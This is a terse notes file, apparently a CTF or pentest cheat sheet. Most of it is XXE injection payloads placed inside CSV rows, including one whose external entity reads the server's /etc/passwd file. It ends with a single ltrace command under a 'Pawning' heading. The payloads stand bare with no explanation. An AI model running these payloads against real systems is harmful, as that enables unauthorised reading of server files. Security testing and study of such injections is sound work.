XXE payloads
-------------------------------------------------------------------------------
<!DOCTYPE warren [ <!ENTITY var SYSTEM "test" > ]>

id,name,email
a,&var;,z     //var =test 

<!DOCTYPE warren [ <!ENTITY var SYSTEM "file:///etc/passwd" > ]>

id,name,email
a,&var;,z
---------------------------------------------------------------------------------


Pawning
-----------------------------------------------------
ltrace -S -f -i ./prgram_name 
